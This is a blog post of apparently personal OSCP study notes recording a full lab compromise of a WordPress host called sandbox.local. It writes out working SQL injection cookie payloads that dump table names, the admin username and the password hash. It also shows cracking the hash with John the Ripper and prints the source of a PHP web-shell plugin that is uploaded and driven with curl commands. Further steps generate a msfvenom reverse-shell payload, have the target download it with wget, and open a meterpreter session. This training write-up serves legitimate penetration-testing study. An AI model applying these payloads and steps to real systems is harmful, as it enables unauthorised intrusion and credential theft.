---
layout: post
title:  "OSCP Origin Part 24_2"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Assembling the Pieces of Penetration Testing"
toc: true
comments: false
rating: 3.5
---

# Summary

- nmap scan identified word press 
- dirbuster  web application enumeration
- wp scan in word press side
- find vulnerabilities in wordpress plugin
- searchsploit to search for vulnerability
- found sql injection vulnerability
- we can obtain cookie from this vulnerabity

---
---
## 1. Nmap Scanning

``` bash   
kali@kali:~$ sudo nmap -sC -sS -p0-65535 sandbox.local
```


-    default set of scripts (-sC)
-    use a SYN scan for faster run time (-sS)
-    scan all ports (-p0-65535)

```bash
Nmap scan report for sandbox.local (10.11.1.250)  
Host is up (0.00060s latency).  
Not shown: 65534 filtered ports  
PORT STATE SERVICE  
22/tcp open ssh  
  
| ssh-hostkey:  
| 2048 86:8f:89:36:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)  
| 256 de:f3:84:f1:cd:f3:c8:9a:30:6d:60:e8:b1:1d:99:27 (ECDSA)  
|\_ 256 14:6a:ba:77:e0:57:e5:0c:c0:cc:76:31:91:8d:dd:9f (ED25519)  
80/tcp open http  
  
|\_http-generator: WordPress 5.3  
|\_http-title: SandBox &#8211; See the future, Feel the shine  
MAC Address: 00:50:56:8A:C8:51 (VMware)  
Nmap done: 1 IP address (1 host up) scanned in 111.66 seconds
```

- open ports **22 and 80**     running a **SSH** service and **HTTP** service on the ports respectively.

-   The **HTTP** service is showing us that the running application might be **WordPress 5.3**

## 2. Targeting the web Application

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/1.jpg)

-    Nmap scan indicated that the web page is running on** WordPress 5.3**, but to confirm that, further enumeration is required

-    themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all

## 3.Web Application Enumeration

   - we begin targeting WordPress specifically, let’s do a** basic directory brute force to discover any potential sensitive files and to confirm that the site is running WordPress**.

-    we will use dirb as follows

```bash
kali@kali:~$ dirb http://sandbox.local
```

   - dirb has many flags and features that we could use, we are choosing to run a simple test.

```bash
...  
\---- Scanning URL: http://sandbox.local/ ----  
+ http://sandbox.local/index.php (CODE:301|SIZE:0)  
+ http://sandbox.local/server-status (CODE:403|SIZE:278)  
\==> DIRECTORY: http://sandbox.local/wp-admin/  
\==> DIRECTORY: http://sandbox.local/wp-content/  
\==> DIRECTORY: http://sandbox.local/wp-includes/  
+ http://sandbox.local/xmlrpc.php (CODE:405|SIZE:42)  
\---- Entering directory: http://sandbox.local/wp-admin/ ----  
+ http://sandbox.local/wp-admin/admin.php (CODE:302|SIZE:0)  
\==> DIRECTORY: http://sandbox.local/wp-admin/css/  
\==> DIRECTORY: http://sandbox.local/wp-admin/images/  
\==> DIRECTORY: http://sandbox.local/wp-admin/includes/  
+ http://sandbox.local/wp-admin/index.php (CODE:302|SIZE:0)  
\==> DIRECTORY: http://sandbox.local/wp-admin/js/  
\==> DIRECTORY: http://sandbox.local/wp-admin/maint/  
\==> DIRECTORY: http://sandbox.local/wp-admin/network/  
\==> DIRECTORY: http://sandbox.local/wp-admin/user/  
\---- Entering directory: http://sandbox.local/wp-content/ ----  
+ http://sandbox.local/wp-content/index.php (CODE:200|SIZE:0)  
\==> DIRECTORY: http://sandbox.local/wp-content/plugins/  
\==> DIRECTORY: http://sandbox.local/wp-content/themes/  
\==> DIRECTORY: http://sandbox.local/wp-content/upgrade/  
\==> DIRECTORY: http://sandbox.local/wp-content/uploads/  
\---- Entering directory: http://sandbox.local/wp-includes/ ----  
(!) WARNING: Directory IS LISTABLE. No need to scan it.  
 (Use mode '-w' if you want to scan it anyway)  
\---- Entering directory: http://sandbox.local/wp-admin/css/ ----  
(!) WARNING: Directory IS LISTABLE. No need to scan it.  
 (Use mode '-w' if you want to scan it anyway)  
...  
\-----------------  
END\_TIME: Mon Dec 9 13:00:40 2019  
DOWNLOADED: 32284 - FOUND: 12
```

### wp Scan

-    scan revealed common WordPress directories on our target (wp-admin, wp-content, and wpincludes)

-    some directories that are listable; however, these are common Word Press directories and likely won’t reveal much

-    more specific scan with WPScan, a WordPress vulnerability scanner that uses a database of known vulnerabilities to discover security issues with WordPress instances

-    For a thorough scan, we will need to provide the **URL of the target  (–url)** and configure the enumerate option** (–enumerate) to include “All Plugins” (ap)**, **“All Themes” (at)**, **“Config backups”(cb)**, and **“Db exports” (dbe)**

``` bash
kali@kali:~$ wpscan --url sandbox.local --enumerate ap,at,cb,dbe
```

```bash  
...  
\[i\] Plugin(s) Identified:  
\[+\] elementor  
| Location: http://sandbox.local/wp-content/plugins/elementor/  
| Last Updated: 2019-12-08T17:19:00.000Z  
| \[!\] The version is out of date, the latest version is 2.7.6  
|  
| Found By: Urls In Homepage (Passive Detection)  
|  
| Version: 2.7.4 (100% confidence)  
| Found By: Query Parameter (Passive Detection)  
| - http://sandbox.local/wp-content/plugins/elementor/assets/css/frontend.min.css?ve  
r\=2.7.4  
| - http://sandbox.local/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=  
2.7.4  
| Confirmed By: Readme - Stable Tag (Aggressive Detection)  
| - http://sandbox.local/wp-content/plugins/elementor/readme.txt  
\[+\] ocean-extra  
| Location: http://sandbox.local/wp-content/plugins/ocean-extra/  
| Last Updated: 2019-11-13T16:17:00.000Z  
| \[!\] The version is out of date, the latest version is 1.5.19  
|  
| Found By: Urls In Homepage (Passive Detection)  
|  
| Version: 1.5.16 (100% confidence)  
| Found By: Readme - Stable Tag (Aggressive Detection)  
| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt  
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)  
| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt  
\[+\] wp-survey-and-poll  
| Location: http://sandbox.local/wp-content/plugins/wp-survey-and-poll/  
| Last Updated: 2019-10-15T10:32:00.000Z  
| \[!\] The version is out of date, the latest version is 1.5.8.2  
|  
| Found By: Urls In Homepage (Passive Detection)  
|  
| Version: 1.5.7.3 (50% confidence)  
| Found By: Readme - ChangeLog Section (Aggressive Detection)  
| - http://sandbox.local/wp-content/plugins/wp-survey-and-poll/readme.txt  
\[+\] Enumerating All Themes (via Passive and Aggressive Methods)  
...
```

-    The most interesting items that we discovered are the three plugins that are installed
    	• elementor  
		• ocean-extra  
		• and wp-survey-and-poll
	
-    search sploit to find possible vulnerabilities in the installed plugins
 - updating searchsploit with the –update option, we can search for each plugin

### Using searchSploit

```bash
kali@kali:~$ searchsploit elementor  
Exploits: No Result  
kali@kali:~$ searchsploit ocean-extra  
Exploits: No Result  
kali@kali:~$ searchsploit wp-survey-and-poll  
Exploits: No Result
```

 - we did not find any exploits

  - Just because a search for **“ocean-extra” **did not find anything, does not mean that nothing exists

   - use a more generic search for ocean-extra, such as “ocean”.

```bash
kali@kali:~$ searchsploit ocean  
\------------------------------------------------------ -------------------------------  
Exploit Title | Path (/usr/share/exploitdb/)  
\------------------------------------------------------ -------------------------------  
Apache Libcloud Digital Ocean API - Local Information | exploits/linux/local/38937.txt  
Ocean FTP Server 1.00 - Denial of Service | exploits/windows/dos/893.pl  
Ocean12 (Multiple Products) - 'Admin\_ID' SQL Injectio | exploits/asp/webapps/32602.txt  
Ocean12 ASP Calendar Manager 1.0 - Authentication Byp | exploits/asp/webapps/26473.txt  
Ocean12 ASP Guestbook Manager 1.0 - Information Discl | exploits/asp/webapps/22484.txt  
Ocean12 Calendar Manager 1.0 - Admin Form SQL Injecti | exploits/php/webapps/25469.txt  
Ocean12 Calendar Manager Gold - Database Disclosure | exploits/php/webapps/7247.txt  
Ocean12 Contact Manager Pro - SQL Injection / Cross\-S | exploits/php/webapps/7244.txt  
Ocean12 FAQ Manager Pro - 'ID' Blind SQL Injection | exploits/php/webapps/7271.txt  
Ocean12 FAQ Manager Pro - 'Keyword' Cross-Site Script | exploits/asp/webapps/32601.txt  
...
```

 - Searching for just** “ocean” **gave us a few results, but reviewing the output shows that none are for a WordPress plugin.
 
 -    do the same for **wp-survey-and-poll** and search for** “survey poll”**.

```bash
kali@kali:~$ searchsploit survey poll  
\------------------------------------------------------ -------------------------------  
Exploit Title | Path (/usr/share/exploitdb/)  
\------------------------------------------------------ -------------------------------  
MD-Pro 1.083.x - Survey Module 'pollID' Blind SQL Inj | exploits/php/webapps/9021.txt  
PHP-Nuke CMS (Survey and Poll) - SQL Injection | exploits/php/webapps/11627.txt  
Pre Survey Poll - 'catid' SQL Injection | exploits/asp/webapps/6119.txt  
WordPress Plugin Survey and Poll 1.1 - Blind SQL Inje | exploits/php/webapps/36054.txt  
Wordpress Plugin Survey & Poll 1.5.7.3 - 'sss\_params' | exploits/php/webapps/45411.txt  
nabopoll 1.2 - 'survey.inc.php?path' Remote File Incl | exploits/php/webapps/3315.txt  
\---------------------------------------------------------------- ---------------------
```

  -  This search looks much more promising
  
  -    fourth and fifth result seem to be for our WordPress plugin
  -    fifth result, titled “Wordpress Plugin Survey & Poll 1.5.7.3”, also matches the version ofour plugin (1.5.7.3) that was found by WPScan

-    inspect the exploit to see if we find anything interesting

```bash
...  
# Description  
# The vulnerability allows an attacker to inject sql commands using a value of a  
# cookie parameter.  
# PoC  
# Step 1. When you visit a page which has a poll or survey, a question will be  
# appeared for answering.  
# Answer that question.  
  
# Step 2. When you answer the question, wp\_sap will be assigned to a value. Open  
# a cookie manager, and change it with the payload showed below;  
\["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"\]  
# It is important that the "OR" statement must be 1=2. Because, application is  
# reflecting the first result of the query. When you make it 1=1, you should see a  
# question from firt record. Therefore OR statement must be returned False.  
# Step 3. Reload the page. Open the source code of the page. Search "sss\_params".  
# You will see the version of DB in value of sss\_params parameter.  
...
```

-    Skimming through the exploit does not mention if further authentication is required.

-    However, **a cookie needs to be set**

-    Let’s go to the plugin website and see if we can find any more information about it.

-    quick Google search for “Wordpress Survey & Poll” leads us to the plugin page

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/2.jpg)

-    We found a similar survey on the home page of sandbox.local.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/3.jpg)

-    Let’s open up Burp Suite, configure the proxy settings in Firefox, and intercept the communications when we interact with the survey

-    With the page loaded and Burp configured to intercept, we will click one of the options of the survey
-    This will result in a request captured in Burp
-    We will click Forward in Burp to continue the pageload.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/4.jpg)

-    when we reload the page, we notice the cookie that the exploit code mentioned was vulnerable.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/5.jpg)

-    With this cookie, we can start attempting to exploit the SQL injection vulnerability

# Summary
- Obtaing password hash from sql injection in mariadb
- Mariadb commands for obtain table name , username , password hash

----------------------------------------
----------------------------------------

## SQL Injection Exploitation

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/6.jpg)

-    captured a request with the vulnerable cookie, we can use it in** Burp’s “Repeater”**to attempt exploitation of the SQL injection

- find the request in Burp’s **“HTTP History” **tab that contained the cookie, right click it, and select “Send to Repeater”

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/7.jpg)

-    “Repeater” tab and view the cookie in its raw form

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/8.jpg)

-    Let’s take the payload from the original exploit, place it into the cookie, and send the request to the server.

```sql
["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]
```
-    According to the exploit, the payload can be inserted into the wp_sap cookie variable value.

-    The value of the cookie variable starts after the “=” sign and must end with a semicolon.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/9.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/10.jpg)
-    The exploit code mentions that the result of the SQL injection will be placed in the sss_params variable within a “script” tag.

-    Searching for the variable in Burp should take us to the location of the output from the SQL injection.

-    We can also set Burp to “auto-scroll” to this location in the future to make exploitation easier so we don’t have to scroll to find the output each time.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/11.jpg)

-    In this output, we can see the version of the database in use. This shows us that the SQL injection worked!

```js
<script type='text/javascript'\>  
/\* <!\[CDATA\[ \*/  
var sss\_params = {"survey\_options":"{\\"options\\":\\"\[\\\\\\"bottom\\\\\\",\\\\\\"easeInOutBack\\\\  
\\",\\\\\\"\\\\\\",\\\\\\"\-webkit-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 2  
04) 70%);-moz-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);-  
ms-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);-o-linear-gr  
adient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);linear-gradient(top , rg  
b(255, 255, 255) 35% , rgb(204, 204, 204) 70%);\\\\\\",\\\\\\"rgb(0, 0, 0)\\\\\\",\\\\\\"rgb(93, 9  
3, 93)\\\\\\",\\\\\\"1\\\\\\",\\\\\\"0\\\\\\",\\\\\\"12\\\\\\",\\\\\\"9\\\\\\",\\\\\\"8\\\\\\",500,\\\\\\"Thank you for yo  
ur feedback!\\\\\\",\\\\\\"0\\\\\\",\\\\\\"0\\\\\\",\\\\\\"0\\\\\\"\]\\",\\"plugin\_url\\":\\"http:\\\\\\/\\\\\\/sandbo  
x.local\\\\\\/wp-content\\\\\\/plugins\\\\\\/wp-survey-and-poll\\",\\"admin\_url\\":\\"http:\\\\\\/\\\\\\/  
sandbox.local\\\\\\/wp-admin\\\\\\/admin-ajax.php\\",\\"survey\_id\\":\\"1550849657\\",\\"style\\":\\  
"modal\\",\\"expired\\":\\"false\\",\\"debug\\":\\"true\\",\\"questions\\":\[\[\\"Are you enjoying t  
he new site?\\",\\"Yes\\",\\"No\\"\],\[\\"10.3.20-MariaDB\\"\]\]}"};  
/\* \]\]> \*/  
</script>
```


### MariaDB
-    Now we know that the database used by this WordPress instance is **10.3.20-MariaDB**

-    MariaDB is a fork of MySQL

-    It was designed to work as a plug-and-play alternative to MySQL and SQL injection exploits used for MySQL typically work for MariaDB as well.
-    Now that we know the SQL injection works, we need to determine our next step.

-    While uploading aPHP shell through MariaDB might enable us to get remote code execution on the Word Press instance, it could be very temperamental and difficult if we don’t have more information about the system.

-    Let’s start with something** easier and extract the admin’s username and password hash.**
-    we will need to get a** list of tables, find the user’s table, get a list of columns, and then finally extract the relevant information**

-    To get a list of table names, we need to **query the information_schema.tables table for the table_name column.**

```sql
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM  
 information_schema.tables#"]
```

-    we have also removed the **“ALL”** from the original payload.

-    This is to decrease the results as **we don’t care about duplicate values.**
-    the payload can by inserted into the **wp_sap cookie value**.
-    the value of the **cookie starts after the “=” sign and ends with a semicolon.**

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/12.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/13.jpg)

- The result includes a large list of tables, but the one that stands out to us most is **wp_users**, since it **will most likely contain the WordPress user information.**

-    Now that we have the table name, we can work on** retrieving its column names.**
-    we query the **column_name column within information_schema**
-    columns, limiting the result to those where the table is **wp_users**
-    This can be done by updating our payload

```sql
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM   
information_schema.columns WHERE table_name='wp_users'#"]
```

-    As with the previous payload, this payload will also be placed in the** wp\_sap cookie value in the Repeater tab.**

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/14.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/15.jpg)

-    The result of our query reveals several column names
-    The most interesting to us are **user_login and user_pass** as these will most likely contain the **credentials to authenticate to the WordPress instance**
-    Next, let’s query for the **username**
-    To do this, we need to send a SQL injection request asking for all **user_login** values from the** wp_users table**.
```sql
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]
```

-    We once again repeat the same injection as before.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/16.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/17.jpg)

-    This query discloses only one username: **wp_ajla_admin**.
-    Now that we have a** username,** it’s time to get the **password hash**
-    To do this, we need to replace **user_login** in our query with **user\_pass**
```sql
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]
```

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/18.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/19.jpg)

-    As a result of our injection, we are able to recover the **admin’s password hash**.

-   Note the encoding at the end; the response contains three “\\” characters to escape the single “/”.

-    This hash will need to be cracked before we **attempt to authenticate against the web application**

# Summary 
- Cracking the password hash with john the ripper

## Cracking the Password

-    Now that **we have the password hash**, we will **need to crack it to get the plain text password**

-    we can run a traditional brute force attack where we try every letter combination in the hopes that one matches up, this might take a very long time.

-    Instead we will choose to start by using the**“rockyou” wordlist**, which is included in Kali Linux.

-    /**usr/share/wordlists/rockyou.txt.gz file** **with gunzip**. This will replace the archivefile with a plain text file.

-    let’s create a file containing the password hash

```bash
kali@kali:~$ echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" > pass.txt
```

### John the Ripper

-    Let’s attempt to crack the password using John the Ripper.

-    We will use the –wordlist option along with the path to our wordlist and provide the filename that contains the password hash.

```bash
kali@kali:~/Desktop/sandbox.local$ john --wordlist=/usr/share/wordlists/rockyou.txt pa  
ss.txt  
...  
!love29jan2006! (?)  
1g 0:00:22:59 DONE 0.000724g/s 10391p/s 10391c/s 10391C/s !lovegod..!lov3h!m  
Use "--show --format=phpass" to display all of the cracked passwords reliably  
Session completed
```

-    Running the command above may take a long time, depending on the CPU of the computer.

-    Based on the output in Listing 872, John indicates that the password is **“!love29jan2006!”**.

-    try to see if we can log in to the web application.

-    By default, the WordPress login page can be found at /wp-admin.

-   Visiting this page prompts us to enter a username and password.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/20.jpg)

-    Once we click Login, we get to the admin dashboard

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/21.jpg)

-    It is possible that you might get a request to verify the admin email

- If this is the case, you can just click “This email is correct” to continue.

-    Now that we are logged in, we can continue our enumeration journey to discover what we should exploit next

# Summary
- Login to word press and enumerate to find credentials
- download malicious wordpress plugin

## Enumerating the Admin Interface
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/22.jpg)

-    Logging in to the admin interface opens up the door for further exploitation

-    Before we start exploring ways to elevate our current access,  
	let’s investigate the options WordPress has to offer
-    One good place to start in WordPress is the **Info tab under the  
	Tools > Site Health section**
	
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/23.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/24.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/25.jpg)

-    On this page, we can determine that the server is running **WordPress using PHP version 7.0.33-0 ubuntu0.16.04.7**

-    We also find that the database is running on the  **10.5.5.11 IP address**, which is different than the one we are currently targeting.

-    This is not unusual as databases and web applications are often run on separate servers

-    we have gathered some basic information, we can attempt to elevate our access.
-    One convenient aspect of having **administrative access to WordPress is that we can install our own plugins**.

-    Plugins in WordPress are written in PHP and do not have many limitations.
-    we could upload a plugin that contains a PHP reverse shell or code execution capabilities
-    Fortunately, others have already created malicious plugins just for this purpose

-    One such plugin can be found in the seclists package, which can be installed in Kali with apt.

```bash
kali@kali:~$ sudo apt install seclists
```

-    Once installed, the seclist directory can be found in  **/usr/share/seclists** and the file that we are looking for can be found in **Web-Shells/WordPress**

```bash
kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress  
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ ls  
bypass-login.php plugin-shell.php
```

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/26.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/27.jpg)

-    The specific file we are looking for is **plugin-shell.php**.

-    Let’s quickly inspect it and find out what it does

```php
1 <?php  
2 /\*  
3 Plugin Name: Cheap & Nasty Wordpress Shell  
4 Plugin URI: https://github.com/leonjza/wordpress-shell  
5 Description: Execute Commands as the webserver you are serving wordpress with!  
Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given  
using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.  
php?cmd=id", should provide you with output such as <code\>uid=33(www-data) gid=verd33(  
www-data) groups\=33(www-data)</code>  
6 Author: Leon Jacobs  
7 Version: 0.3  
8 Author URI: https://leonjza.github.io  
9 \*/
```

-    Lines 2-9 in Listing 875 are comments that are required for WordPress to recognize the file as a plugin.

```php
11 # attempt to protect myself from deletion  
12 $this\_file = \_\_FILE\_\_;  
13 @system("chmod ugo-w $this\_file");  
14 @system("chattr +i $this\_file");
```

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/28.jpg)

 - Lines 12-14 attempt protect the file from being deleted by the system

```php
19 # test if parameter 'cmd', 'ip or 'port' is present. If not this will avoid an err  
or on logs or on all pages if badly configured.  
20 if(isset($\_REQUEST\[$cmd\])) {  
21  
22 # grab the command we want to run from the 'cmd' GET or POST parameter (POST d  
on't display the command on apache logs)  
23 $command = $\_REQUEST\[$cmd\];  
24 executeCommand($command);
```

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/29.jpg)

-    Lines 20-24 will attempt to run a system command if the cmd variable is set in the HTTP request

-    The plugin will use the execute Command function in order to identify and execute the appropriate PHP internal API to run a command on the target system.
-    The execute Command function can befound on Lines 47-82.

```php
47 function executeCommand(string $command) {  
48  
49 # Try to find a way to run our command using various PHP internals  
50 if (class\_exists('ReflectionFunction')) {  
51  
52 # http://php.net/manual/en/class.reflectionfunction.php  
53 $function = new ReflectionFunction('system');  
54 $function\->invoke($command);  
55  
56 } elseif (function\_exists('call\_user\_func\_array')) {  
57  
58 # http://php.net/manual/en/function.call-user-func-array.php  
59 call\_user\_func\_array('system', array($command));  
60  
61 } elseif (function\_exists('call\_user\_func')) {  
62  
63 # http://php.net/manual/en/function.call-user-func.php  
64 call\_user\_func('system', $command);  
65  
66 } else if(function\_exists('passthru')) {  
67  
68 # https://www.php.net/manual/en/function.passthru.php  
69 ob\_start();  
70 passthru($command , $return\_var);  
71 $output = ob\_get\_contents();  
72 ob\_end\_clean();  
73  
74 } else if(function\_exists('system')){  
75  
76 # this is the last resort. chances are PHP Suhosin  
77 # has system() on a blacklist anyways :>  
78  
79 # http://php.net/manual/en/function.system.php  
80 system($command);  
81 }  
82 }
```

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/30.jpg)

-    The plugin-shell.php plugin is a catalyst to execute commands on the system

-    Once we are able to trigger arbitrary code execution on the compromised host, there are a number of methods we could use to obtain a proper reverse shell.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/31.jpg)


# Summary

- Creating a reverse shell from Word press plugin
- trigger the word press plugin
- get reverse shell in the meterpreter

-----------------------------------------

-----------------------------------------
## Obtaining a Shell

-    WordPress expects plugins to be in a zip file. 

-    WordPress receives the zip file, it will extract it into the wp-content/plugins directory on the server.

-    **WordPress places the contents of the zip file into a folder that matches the name of the zip file itself**.

-    we will need to **make note of the name of the file in order to be able to access our PHP shell** later on.

#### Creation of zip file

```bash
kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress  
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip plugin\-s  
hell.php  
 adding: plugin-shell.php (deflated 58%)
```

 - zip file is named plugin-shell.zip
 
 - placed in the plugin-shell folder within wp-content/plugins on the server

-    plugin package is generated, it’s time to upload the shell

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/32.jpg)
-    install the plugin by clicking Add New at the top left. This will take us to the “Add Plugins”page.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/33.jpg)
-    we are not downloading a plugin from the WordPress plugin directory, we need to select Upload Plugin at the top left of the page

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/34.jpg)

-    we can select our plugin package
-    We need to select Browse,which will open up a file dialog for us to find the created package.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/35.jpg)

-    we navigate to the directory containing our plugin, select the pluginshell.zip file

-    we click Install Now

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/36.jpg)
-    Installing the plugin will upload the zip and extract the contents

-    plugin is installed, we can attempt to use it to run system commands on theWordPress target. 

-    For this, we can simply use cURL. As discussed earlier, the directory for the plugin is **wp-content/plugins/**

-    the zip will be extracted into a directory named plugin-shell, and the file that we are targeting is named **plugin-shell.php**.

-    we must also **set a cmd parameter containing the command we are attempting to execute on the target system**. 

-    Let’s attempt to **run whoami **and see if the shell worked.

-    It worked! Based on the output of Listing 880, we are running commands as the **www-data user**.

-    Now it’s time to upload a **meterpreter payload and obtain a full reverse shell.**

-    generate a **meterpreter payload with the msfvenom utility**

```bash
kali@kali:~$ msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=10.11.0.4 LPORT=443 -  
f elf > shell.elf
```

-    We are selecting the **Linux reverse TCP meterpreter payload ** since we know that the **target isrunning on Ubuntu** .

-    The** LHOST option will point to our KaliIP address and we are selecting an LPORT of 443** in an **attempt to evade any outbound firewall rules**.

-    While it’s good practice to always check for any egress filtering, in this case we will make the **assumption that port 443 is unrestricted**. 
 
-   We are generating the payload as an elf file and redirecting the output to a file named **shell.elf** in the kali user home directory.

-   meterpreter reverse shell generated, we start a web server to allow the target to downloadthe shell

```bash
kali@kali:~$ sudo python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 ...
```

- Python http.server module, is instructed to use port 80,and is serving files from the kali user home directory. 

- We chose port 80 again to avoid any potential issues we might run into if there is a** firewall blocking arbitrary outbound ports.**
-    we will instruct the target to download theshell. 
-    We will use **wget from the target to download the shell from our Kali system**. 

-    However, we must **encode any space characters with “%20” since we cannot use spaces in URLs**. 

```bash
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph  
p?cmd=wget%20http://10.11.0.4/shell.elf
```

```bash
Serving HTTP on 0.0.0.0 port 80 ...  
10.11.1.250 - -[09/Dec/2019 19:40:16] "GET /shell.elf HTTP/1.1" 200 -
```

-    we need to **make the shell executable** 
-    **start a Metasploit payload handler on Kali**,and **run the elf file on the target** to **acquire a meterpreter shell.**

-    To make the shell executable, we will run **chmod +x on it.**

-    Once again, we need to remember to urlencode sensitive characters **such as space (%20) and “+” (%2b). **

```bash
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph  
p?cmd=chmod%20%2bx%20shell.elf
```

-    At this point, the shell should be executable. 

-    Next, we will start a meterpreter payload listener on the appropriate interface and port.

```bash
kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\ 
> set PAYLOAD linux/x86/meterpreter/reverse\_tcp;\ 
> set LHOST 10.11.0.4;\
> set LPORT 443;\ 
> run"  
PAYLOAD => linux/x86/meterpreter/reverse_tcp  
LHOST => 10.11.0.4  
LPORT => 443  
[*] Started reverse TCP handler on 10.11.0.4:443
```

   - In the msfconsole command above, we are having Metasploit start **quietly (-q)** and **immediately configure the payload handler via the -x option**, passing the same payload settings we used when generating the shell.
   
-    it’s finally time to obtain a reverse shell. This can be done by executing the **shell.elf** file via the malicious WordPress plugin we installed previously.

```bash
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph  
p?cmd=./shell.elf
```

```bash
[*] Sending stage (985320 bytes) to 10.11.1.250  
[*] Meterpreter session 1 opened (10.11.0.4:443 -> 10.11.1.250:53768) at 19:54:41  
meterpreter > shell  
Process 9629 created.  
Channel 1 created.  
whoami  
www-data  
exit  
meterpreter >
```

-    move on to post-exploitation enumeration.

# Summary

- gather some information about the database credentials through enumeration

-----------------------------------------

-----------------------------------------

-    gather some basic information about the host such as network configuration, hostname,OS version, etc

```bash
meterpreter > shell  
Process 6667 created.  
Channel 3 created.  
ifconfig  
ens160 Link encap:Ethernet HWaddr 00:50:56:8a:82:85  
 inet addr:10.4.4.10 Bcast:10.4.4.255 Mask:255.255.255.0  
 inet6 addr: fe80::250:56ff:fe8a:8285/64 Scope:Link  
 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1  
  RX packets:29154 errors:0 dropped:22 overruns:0 frame:0  
 TX packets:176526 errors:0 dropped:0 overruns:0 carrier:0  
 collisions:0 txqueuelen:1000  
 RX bytes:8327519 (8.3 MB) TX bytes:13590061 (13.5 MB)  
...  
hostname  
ajla  
cat /etc/issue  
Ubuntu 16.04 LTS \n \l  
cat /proc/version  
Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5  
.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016
```

-    this basic information gathering, we learn that the **host is named “Ajla”**, the **IP address is 10.4.4.10,** and the version of** Linux is Ubuntu 16.04.12 on a 4.4.0-21-generic kernel**.

  - collected this basic information, we can move on to more specific enumeration.
   
   -    **target is running WordPress** and we found out that the **database is on another host**,we know that **there should be database credentials somewhere on this system.**

-    A quick Googlesearch reveals that the **wp-config.php file is where we can find the database configuration forWordPress**.

```bash
meterpreter > shell
Process 9702 created.
Channel 1 created.
pwd
/var/www/html/wp-content/plugins/plugin-shell
cd /var/www/html
ls -alh
...
-rw-r--r-- 1 www-data www-data 2.3K Jan 20 2019 wp-comments-post.php
